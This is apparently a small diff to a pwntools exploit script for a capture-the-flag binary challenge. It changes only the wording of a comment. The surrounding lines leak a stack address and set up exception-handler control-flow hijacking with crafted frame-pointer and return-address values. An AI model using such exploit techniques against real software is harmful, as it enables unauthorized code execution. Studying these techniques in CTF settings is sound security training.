@@ -233,7 +233,7 @@ enter_message(0x20, b'A'*0x18)
 stack_addr = u64(p.recvline().strip()[-6:].ljust(8, b'\x00'))
 log.info(f"stack address: {hex(stack_addr)}")
 
-# 2. chop to hijack execution flow as small_message's try block -> big_message's catch block -> main's catch block -> main's try block
+# 2. chop to hijack execution path as small_message's try block -> big_message's catch block -> main's catch block -> main's try block
 big_message_catch_rbp_val = stack_addr+0x30
 small_message_return_addr = 0x4016a1+5  # must be an address within big_message's try block
 main_rbp_val = 0x404800
